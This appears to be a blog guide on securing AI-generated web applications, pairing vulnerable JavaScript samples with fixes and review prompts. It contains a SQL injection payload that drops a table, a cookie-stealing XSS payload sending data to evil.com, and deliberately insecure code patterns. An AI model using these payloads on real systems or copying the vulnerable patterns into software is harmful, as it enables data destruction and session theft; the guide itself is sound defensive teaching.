@@ -1,0 +1,279 @@
+---
+title: "Security for Vibecoded Applications"
+date: "2026-03-20"
+description: "A security-focused guide for vibeccoders — covering the most common vulnerabilities in AI-generated code and how to prevent them."
+tags: ["security", "best-practices", "tutorial"]
+readTime: "10 min read"
+difficulty: "Advanced"
+---
+
+# Security for Vibecoded Applications
+
+AI-generated code optimizes for functionality — making things work. It rarely optimizes for security unless you explicitly ask. This guide covers the vulnerabilities that show up most often in vibecoded projects and how to prevent each one.
+
+## The OWASP Top 5 for Vibecoded Apps
+
+### 1. Injection Attacks
+
+**What it is:** An attacker inserts malicious code through user input that gets executed by your server.
+
+**How AI creates this vulnerability:**
+
+```javascript
+// AI-generated search endpoint — VULNERABLE
+app.get('/search', (req, res) => {
+  const query = req.query.q;
+  const results = db.query(`SELECT * FROM products WHERE name LIKE '%${query}%'`);
+  res.json(results);
+});
+```
+
+If a user searches for `'; DROP TABLE products; --`, your database table is gone.
+
+**The fix prompt:**
+
+```
+Rewrite this search endpoint using parameterized queries.
+Never interpolate user input directly into SQL strings.
+Use prepared statements or your ORM's query builder.
+```
+
+**Secure version:**
+
+```javascript
+app.get('/search', (req, res) => {
+  const query = req.query.q;
+  const results = db.query(
+    'SELECT * FROM products WHERE name LIKE ?',
+    [`%${query}%`]
+  );
+  res.json(results);
+});
+```
+
+### 2. Cross-Site Scripting (XSS)
+
+**What it is:** An attacker injects JavaScript that runs in other users' browsers.
+
+**How AI creates this vulnerability:**
+
+```jsx
+// AI-generated comment display — VULNERABLE
+function Comment({ text }) {
+  return <div dangerouslySetInnerHTML={{ __html: text }} />;
+}
+```
+
+If someone posts a comment containing `<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>`, every user viewing that comment gets their session stolen.
+
+**The fix:** Never use `dangerouslySetInnerHTML` with user content. If you must render HTML, sanitize it:
+
+```
+Rewrite this component to safely render user-generated content.
+Use DOMPurify to sanitize HTML before rendering.
+If HTML rendering isn't needed, just render as plain text.
+```
+
+### 3. Broken Authentication
+
+**What it is:** Weak or missing checks that let attackers access accounts they shouldn't.
+
+**Common AI mistakes:**
+
+```javascript
+// Storing passwords in plain text
+await db.user.create({
+  data: { email, password } // NOT HASHED!
+});
+
+// Using weak session tokens
+const token = Math.random().toString(36); // Predictable!
+
+// No rate limiting on login
+app.post('/login', async (req, res) => {
+  // An attacker can try millions of passwords
+});
+```
+
+**The fix prompt:**
+
+```
+Implement secure authentication:
+- Hash passwords with bcrypt (cost factor 12)
+- Use cryptographically secure session tokens (crypto.randomUUID)
+- Rate limit login attempts (max 5 per minute per IP)
+- Set cookies with HttpOnly, Secure, and SameSite flags
+- Sessions expire after 24 hours of inactivity
+```
+
+### 4. Sensitive Data Exposure
+
+**What it is:** API keys, passwords, or personal data leaking to unauthorized parties.
+
+**How AI creates this vulnerability:**
+
+```javascript
+// API key in client-side code — visible to everyone
+const OPENAI_KEY = "sk-abc123...";
+fetch('https://api.openai.com/v1/chat', {
+  headers: { 'Authorization': `Bearer ${OPENAI_KEY}` }
+});
+```
+
+```javascript
+// Returning full user object including password hash
+app.get('/api/user/:id', async (req, res) => {
+  const user = await db.user.findUnique({ where: { id: req.params.id } });
+  res.json(user); // Includes passwordHash, email, etc.
+});
+```
+
+**The fix prompt:**
+
+```
+Review this code for data exposure:
+1. Move all API keys to server-side environment variables
+2. Never return password hashes in API responses
+3. Create a sanitized user object that only includes
+   safe fields (id, name, email)
+4. Add .env to .gitignore
+```
+
+### 5. Broken Access Control
+
+**What it is:** Users can access data or perform actions they shouldn't.
+
+**How AI creates this vulnerability:**
+
+```javascript
+// Any user can delete any user's data
+app.delete('/api/posts/:id', async (req, res) => {
+  await db.post.delete({ where: { id: req.params.id } });
+  res.status(204).end();
+});
+```
+
+There's no check that the logged-in user owns this post. Any authenticated user can delete anyone's content.
+
+**The fix:**
+
+```javascript
+app.delete('/api/posts/:id', async (req, res) => {
+  const post = await db.post.findUnique({ where: { id: req.params.id } });
+
+  if (!post) return res.status(404).json({ error: "Not found" });
+  if (post.userId !== req.user.id) return res.status(403).json({ error: "Forbidden" });
+
+  await db.post.delete({ where: { id: req.params.id } });
+  res.status(204).end();
+});
+```
+
+Always verify ownership before modify/delete operations.
+
+## Security Prompt Template
+
+Add this to every prompt that involves user data, authentication, or APIs:
+
+```
+Security requirements:
+- Validate and sanitize all user inputs
+- Use parameterized queries (never string concatenation for SQL)
+- Hash passwords with bcrypt before storage
+- Never expose API keys in client-side code
+- Return only necessary fields in API responses (no password hashes)
+- Check authorization (does this user own this resource?)
+- Set security headers (CORS, CSP, X-Frame-Options)
+- Rate limit sensitive endpoints (login, signup, password reset)
+```
+
+## Security Headers
+
+Ask AI to add these headers to your application:
+
+```
+Add these security headers to my Next.js app:
+
+Content-Security-Policy: default-src 'self';
+  script-src 'self' 'unsafe-inline';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=()
+```
+
+## Environment Variables
+
+### The Rules
+
+1. **Never commit `.env` files** — Add `.env` to `.gitignore`
+2. **Use `.env.example`** — Commit a template with empty values so other developers know what's needed
+3. **Different values per environment** — Development, staging, and production should use different keys
+4. **Server-side only** — In Next.js, only variables prefixed with `NEXT_PUBLIC_` are exposed to the client. Keep secrets without this prefix.
+
+### The Prompt
+
+```
+Review my code and identify any hardcoded secrets,
+API keys, passwords, or connection strings.
+Move them to environment variables and update the code
+to read from process.env. Create a .env.example file
+with placeholder values.
+```
+
+## Dependency Security
+
+AI often suggests packages without checking their security:
+
+```
+Before using any npm package, check:
+1. Is it actively maintained? (last commit within 6 months)
+2. Does it have known vulnerabilities? (run npm audit)
+3. How many weekly downloads? (avoid obscure packages)
+4. Is it from a trusted publisher?
+
+Prefer well-known packages: bcrypt over custom-hash-lib,
+next-auth over roll-your-own-auth.
+```
+
+Run `npm audit` regularly and fix reported vulnerabilities.
+
+## The Security Review Prompt
+
+After generating any feature that handles user data or authentication, run this review:
+
+```
+Security review this code. Check for:
+
+1. SQL injection — Are all queries parameterized?
+2. XSS — Is user content escaped before rendering?
+3. CSRF — Are state-changing requests protected?
+4. Auth bypass — Can unauthenticated users access protected routes?
+5. Authorization — Can users access other users' data?
+6. Data exposure — Are passwords, tokens, or keys visible?
+7. Input validation — Are all inputs validated and sanitized?
+8. Rate limiting — Are sensitive endpoints rate-limited?
+
+For each issue found, show the vulnerable code and the fix.
+```
+
+## Quick Security Wins
+
+These take less than 10 minutes each:
+
+- [ ] Run `npm audit fix` to patch known dependency vulnerabilities
+- [ ] Add `.env` to `.gitignore` (check it's not already committed)
+- [ ] Replace any hardcoded API keys with environment variables
+- [ ] Add `HttpOnly` and `Secure` flags to session cookies
+- [ ] Add rate limiting to login and signup endpoints
+- [ ] Verify all database queries use parameterized statements
+- [ ] Remove `console.log` statements that might leak data
+
+## Next Steps
+
+- Scan your code with the [Vibe Checker](/tools/vibe-checker) for automated security review
+- Read about [common vibecoding failures](/blog/when-vibecoding-goes-wrong) that include security disasters
+- Check the [deployment guide](/guides/deploying-your-project) for production security setup
